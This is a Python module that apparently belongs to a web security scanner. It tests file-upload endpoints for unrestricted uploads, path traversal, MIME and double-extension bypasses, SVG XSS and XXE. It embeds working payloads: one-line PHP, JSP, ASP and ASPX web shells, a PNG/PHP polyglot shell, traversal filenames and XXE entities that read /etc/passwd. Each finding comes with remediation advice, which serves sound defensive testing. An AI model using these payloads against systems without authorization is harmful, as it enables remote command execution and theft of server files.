"""
File Upload Vulnerability Detection Module
Tests file upload functionality for security issues
"""

import os
import io
import re
from typing import Dict, List
from urllib.parse import urlparse, urljoin
from utils.logger import get_logger

logger = get_logger(__name__)


class FileUploadTester:
    """Test file upload vulnerabilities."""
    
    def __init__(self, http_client, config: Dict):
        """Initialize file upload tester."""
        self.http_client = http_client
        self.config = config
    
    def _verify_upload(self, upload_url: str, filename: str, response) -> bool:
        """Try to verify an uploaded file is accessible via GET."""
        parsed = urlparse(upload_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        clean_name = os.path.basename(filename)

        location = response.headers.get('Location', '') if hasattr(response, 'headers') else ''
        if location and clean_name in location:
            loc_url = urljoin(base_url, location)
            try:
                resp = self.http_client.get(loc_url)
                if resp and resp.status_code == 200:
                    return True
            except Exception:
                pass

        text = response.text if hasattr(response, 'text') and response.text else ''
        url_pattern = re.compile(rf'(https?://[^\s"\'<>]{{0,500}}{re.escape(clean_name)})', re.I)
        for match in url_pattern.finditer(text):
            try:
                resp = self.http_client.get(match.group(1))
                if resp and resp.status_code == 200:
                    return True
            except Exception:
                pass

        upload_dirs = ['/uploads/', '/files/', '/upload/', '/media/', '/static/']
        for path in upload_dirs:
            test_url = urljoin(base_url, f"{path}{clean_name}")
            try:
                resp = self.http_client.get(test_url)
                if resp and resp.status_code == 200:
                    return True
            except Exception:
                pass

        return False

    def test_file_upload(self, url: str, context: Dict) -> List[Dict]:
        """
        Test file upload functionality for vulnerabilities.
        
        Args:
            url: Upload endpoint URL
            context: Request context
            
        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        
        vulnerabilities.extend(self._test_unrestricted_file_upload(url))
        vulnerabilities.extend(self._test_path_traversal_upload(url))
        vulnerabilities.extend(self._test_file_type_bypass(url))
        vulnerabilities.extend(self._test_malicious_file_content(url))
        vulnerabilities.extend(self._test_double_extension(url))
        vulnerabilities.extend(self._test_svg_xss(url))
        vulnerabilities.extend(self._test_xxe_via_upload(url))
        
        return vulnerabilities
    
    def _test_unrestricted_file_upload(self, url: str) -> List[Dict]:
        """Test for unrestricted file upload."""
        vulnerabilities = []
        
        dangerous_extensions = [
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'PHP Web Shell'),
            ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'JSP Web Shell'),
            ('shell.asp', '<% eval request("cmd") %>', 'ASP Web Shell'),
            ('shell.aspx', '<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start(Request["cmd"]));%>', 'ASPX Web Shell'),
            ('exploit.exe', 'MZ\x90\x00', 'Executable File'),
        ]
        
        for filename, content, file_type in dangerous_extensions:
            try:
                files = {'file': (filename, io.BytesIO(content.encode()), 'application/octet-stream')}
                response = self.http_client.post(url, files=files)
                
                if response and response.status_code in [200, 201]:
                    uploaded_text = response.text.lower()
                    if 'success' in uploaded_text or 'uploaded' in uploaded_text:
                        accessible = self._verify_upload(url, filename, response)
                        evidence = f'Upload accepted by server: {file_type} ({filename}).'
                        if accessible:
                            evidence += ' File was verified as accessible via GET.'
                        else:
                            evidence += ' Could not confirm file is stored or accessible.'
                        
                        vulnerabilities.append({
                            'type': 'File Upload - Upload Accepted (Unconfirmed)',
                            'severity': 'high',
                            'url': url,
                            'evidence': evidence,
                            'description': 'Server accepted a potentially dangerous file type upload',
                            'remediation': 'Implement file type whitelist, validate MIME types, scan content',
                            'cwe': 'CWE-434: Unrestricted Upload of File with Dangerous Type'
                        })
            except Exception as e:
                logger.debug(f"Error testing file upload: {e}")
        
        return vulnerabilities
    
    def _test_path_traversal_upload(self, url: str) -> List[Dict]:
        """Test for path traversal in file uploads."""
        vulnerabilities = []
        
        traversal_filenames = [
            '../../../shell.php',
            '..\\..\\..\\shell.php',
            '....//....//....//shell.php',
            '..;/..;/..;/shell.php',
            'shell.php/../../',
        ]
        
        for filename in traversal_filenames:
            try:
                files = {'file': (filename, io.BytesIO(b'test'), 'text/plain')}
                response = self.http_client.post(url, files=files)
                
                if response and response.status_code in [200, 201]:
                    accessible = self._verify_upload(url, filename, response)
                    evidence = f'Path traversal filename accepted by server: {filename}.'
                    if accessible:
                        evidence += ' File was verified as accessible via GET.'
                    else:
                        evidence += ' Could not confirm file is stored outside upload directory.'
                    
                    vulnerabilities.append({
                        'type': 'File Upload - Path Traversal (Unconfirmed)',
                        'severity': 'medium',
                        'url': url,
                        'evidence': evidence,
                        'description': 'Server accepted a filename with path traversal characters',
                        'remediation': 'Sanitize filenames, use basename(), restrict upload directory',
                        'cwe': 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory'
                    })
                    break
            except Exception as e:
                logger.debug(f"Error testing path traversal upload: {e}")
        
        return vulnerabilities
    
    def _test_file_type_bypass(self, url: str) -> List[Dict]:
        """Test for file type validation bypass."""
        vulnerabilities = []
        
        bypass_tests = [
            ('shell.php', '<?php echo "test"; ?>', 'image/jpeg'),
            ('image.jpg.php', '<?php echo "test"; ?>', 'image/jpeg'),
            ('image.php.jpg', '<?php echo "test"; ?>', 'image/jpeg'),
        ]
        
        for filename, content, mime_type in bypass_tests:
            try:
                files = {'file': (filename, io.BytesIO(content.encode()), mime_type)}
                response = self.http_client.post(url, files=files)
                
                if response and response.status_code in [200, 201]:
                    accessible = self._verify_upload(url, filename, response)
                    evidence = f'Dangerous file accepted with misleading MIME type: {filename}.'
                    if accessible:
                        evidence += ' File was verified as accessible via GET.'
                    else:
                        evidence += ' Could not confirm file execution capability.'
                    
                    vulnerabilities.append({
                        'type': 'File Upload - MIME Type Bypass (Unconfirmed)',
                        'severity': 'medium',
                        'url': url,
                        'evidence': evidence,
                        'description': 'Server accepted a file with misleading MIME type',
                        'remediation': 'Validate actual file content, not just MIME type or extension',
                        'cwe': 'CWE-434: Unrestricted Upload of File with Dangerous Type'
                    })
            except Exception as e:
                logger.debug(f"Error testing MIME bypass: {e}")
        
        return vulnerabilities
    
    def _test_malicious_file_content(self, url: str) -> List[Dict]:
        """Test for malicious file content detection."""
        vulnerabilities = []
        
        polyglot_content = b'\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>'
        
        try:
            files = {'file': ('image.png', io.BytesIO(polyglot_content), 'image/png')}
            response = self.http_client.post(url, files=files)
            
            if response and response.status_code in [200, 201]:
                accessible = self._verify_upload(url, 'image.png', response)
                evidence = 'Polyglot file (image + embedded code) accepted by server.'
                if accessible:
                    evidence += ' File was verified as accessible via GET.'
                else:
                    evidence += ' Could not confirm file is stored or executable.'
                
                vulnerabilities.append({
                    'type': 'File Upload - Polyglot File Accepted (Unconfirmed)',
                    'severity': 'medium',
                    'url': url,
                    'evidence': evidence,
                    'description': 'Server accepted a file containing embedded code',
                    'remediation': 'Implement file content scanning, re-encode images',
                    'cwe': 'CWE-434: Unrestricted Upload of File with Dangerous Type'
                })
        except Exception as e:
            logger.debug(f"Error testing polyglot files: {e}")
        
        return vulnerabilities
    
    def _test_double_extension(self, url: str) -> List[Dict]:
        """Test for double extension vulnerabilities."""
        vulnerabilities = []
        
        double_extensions = [
            'file.php.jpg',
            'file.php.png',
            'file.php.gif',
            'file.php.txt',
            'file.jsp.jpg',
            'file.asp.jpg',
        ]
        
        for filename in double_extensions:
            try:
                files = {'file': (filename, io.BytesIO(b'<?php echo "test"; ?>'), 'image/jpeg')}
                response = self.http_client.post(url, files=files)
                
                if response and response.status_code in [200, 201]:
                    accessible = self._verify_upload(url, filename, response)
                    evidence = f'Double extension file accepted by server: {filename}.'
                    if accessible:
                        evidence += ' File was verified as accessible via GET.'
                    else:
                        evidence += ' Could not confirm file execution capability.'
                    
                    vulnerabilities.append({
                        'type': 'File Upload - Double Extension Accepted (Unconfirmed)',
                        'severity': 'medium',
                        'url': url,
                        'evidence': evidence,
                        'description': 'Server accepted a file with double extension',
                        'remediation': 'Validate complete filename, not just last extension',
                        'cwe': 'CWE-434: Unrestricted Upload of File with Dangerous Type'
                    })
                    break
            except Exception as e:
                logger.debug(f"Error testing double extension: {e}")
        
        return vulnerabilities
    
    def _test_svg_xss(self, url: str) -> List[Dict]:
        """Test for XSS via SVG upload."""
        vulnerabilities = []
        
        svg_xss_content = '''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert('XSS');
  </script>
</svg>'''
        
        try:
            files = {'file': ('image.svg', io.BytesIO(svg_xss_content.encode()), 'image/svg+xml')}
            response = self.http_client.post(url, files=files)
            
            if response and response.status_code in [200, 201]:
                accessible = self._verify_upload(url, 'image.svg', response)
                evidence = 'SVG file with embedded JavaScript accepted by server.'
                if accessible:
                    evidence += ' File was verified as accessible via GET.'
                else:
                    evidence += ' Could not confirm file is accessible or rendered.'
                
                vulnerabilities.append({
                    'type': 'File Upload - SVG XSS (Unconfirmed)',
                    'severity': 'medium',
                    'url': url,
                    'evidence': evidence,
                    'description': 'Server accepted an SVG file containing JavaScript',
                    'remediation': 'Sanitize SVG files, serve with Content-Disposition: attachment',
                    'cwe': 'CWE-79: Cross-site Scripting (XSS)'
                })
        except Exception as e:
            logger.debug(f"Error testing SVG XSS: {e}")
        
        return vulnerabilities
    
    def _test_xxe_via_upload(self, url: str) -> List[Dict]:
        """Test for XXE via file upload."""
        vulnerabilities = []
        
        xxe_svg = '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>'''
        
        xxe_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>'''
        
        test_files = [
            ('xxe.svg', xxe_svg, 'image/svg+xml'),
            ('xxe.xml', xxe_xml, 'application/xml'),
        ]
        
        for filename, content, mime_type in test_files:
            try:
                files = {'file': (filename, io.BytesIO(content.encode()), mime_type)}
                response = self.http_client.post(url, files=files)
                
                if response and response.status_code in [200, 201]:
                    if 'root:' in response.text or 'nobody' in response.text:
                        vulnerabilities.append({
                            'type': 'File Upload - XXE via Upload',
                            'severity': 'critical',
                            'url': url,
                            'evidence': f'XXE payload in {filename} resulted in file content disclosure in response',
                            'description': 'File upload vulnerable to XML External Entity (XXE) attacks - server-side file content was disclosed',
                            'remediation': 'Disable XML external entity processing, use safe parsers',
                            'cwe': 'CWE-611: Improper Restriction of XML External Entity Reference'
                        })
                        break
            except Exception as e:
                logger.debug(f"Error testing XXE via upload: {e}")
        
        return vulnerabilities
